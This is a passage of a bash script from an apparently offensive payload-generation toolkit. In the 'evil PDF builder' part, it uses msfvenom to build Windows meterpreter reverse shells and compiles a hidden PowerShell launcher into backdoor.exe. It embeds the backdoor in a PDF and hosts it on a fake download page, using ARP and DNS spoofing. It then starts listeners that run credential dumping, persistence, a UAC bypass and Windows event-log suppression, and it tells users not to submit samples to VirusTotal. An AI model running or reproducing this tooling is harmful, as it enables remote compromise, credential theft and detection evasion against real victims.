            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# EVIL PDF BUILDER
# ----------------------------------------------------
sh_shellcode15 () {

echo "[☠] EVIL PDF BUILDER -> running..."
echo "[☠] targets: windows xp/vista/7!"
sleep 1
# input PDF output format
oUt=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nevil PDF builder\ncrypting mechanisms available:" --radiolist --column "Pick" --column "Option" TRUE "base64" FALSE "random xor key" --width 300 --height 200) > /dev/null 2>&1


if [ "$oUt" = "base64" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF NAME ☠" --text "Enter pdf output name\nexample: EvilPdf" --width 300) > /dev/null 2>&1
Myd0=$(zenity --title "☠ SELECT PDF FILE TO BE EMBEDDED ☠" --filename=$IPATH --file-selection --text "chose PDF file to use to be serve as template") > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="EvilPdf";fi
if [ -z "$Myd0" ]; then echo "${RedF}[x]${white} This Module Requires PDF absoluct path input";sleep 3; sh_exit;fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
echo "[☠] meterpreter over SSL sellected .."
sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | TROJAN  : $N4m.pdf
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


# display shellcode
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


echo "[☠] Building template -> template.c!"
sleep 2
# build template file in C language
# reproduction of venom option 6 payload
echo "// C template | Author: r00t-3xp10it " > $IPATH/output/template.c
echo "// execute shellcode powershell base 64 encoded into memory (ram) " >> $IPATH/output/template.c
echo "// ---" >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "#include <stdio.h> " >> $IPATH/output/template.c
echo "#include <stdlib.h> " >> $IPATH/output/template.c
echo "" >> $IPATH/output/template.c
echo "int main()" >> $IPATH/output/template.c
echo "{" >> $IPATH/output/template.c
echo ' system("powershell -nop -exec bypass -win Hidden -noni -enc InJ3C"); ' >> $IPATH/output/template.c
echo " return 0; " >> $IPATH/output/template.c
echo "}" >> $IPATH/output/template.c

# injecting shellcode into template using SED+bash variable ( $str0 ) = command substitution
sed -i "s|InJ3C|$str0|" $IPATH/output/template.c


# compile template.c into one stand-alone-executable file using mingw32
# template.c (C code to be compiled) -o (save output name)
echo "[☠] Compiling template.c -> backdoor.exe!"
sleep 2
$ComP $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows
strip --strip-debug $IPATH/output/backdoor.exe



# if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
# using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1


# move files from metasploit to local directory
mv ~/.msf4/local/$N4m.pdf $IPATH/output/$N4m.pdf


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$oUt" = "base64" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi




# ---------------------------------------
# chose to build the xor encrypted one :D
# ---------------------------------------
else



# config settings in PDF_encoder.py script
ec=`echo ~`
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ ENTER PDF OUTPUT NAME ☠" --text "Enter pdf output name\nexample: XorPdf" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
sleep 2
cd $IPATH/templates/evil_pdf
cp PDF_encoder.py PDF_encoder[bak].py
# config pdf_encoder.py
sed -i "s|Sk3lL3T0n|$IPATH/templates/evil_pdf/skelleton.c|" PDF_encoder.py
sed -i "s|EXE::CUSTOM backdoor.exe|EXE::CUSTOM $ec/backdoor.exe|" PDF_encoder.py
sed -i "s|Lh0St|$lhost|" PDF_encoder.py
sed -i "s|lP0Rt|$lport|" PDF_encoder.py


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="XorPdf";fi


# runing evil-pdf-builder python script
xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
# moving files
mv PDF_encoder[bak].py PDF_encoder.py
mv ~/backdoor.exe $IPATH/output/backdoor.exe
mv ~/backdoor.pdf $IPATH/output/$N4m.pdf
echo "[☠] files generated into output folder..."
cd $IPATH


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.pdf\n\nchose how to deliver: $N4m.pdf" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.pdf|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.pdf|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.pdf|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.pdf $ApAcHe/$N4m.pdf
        echo "- ATTACK VECTOR: http://mega-upload.com"
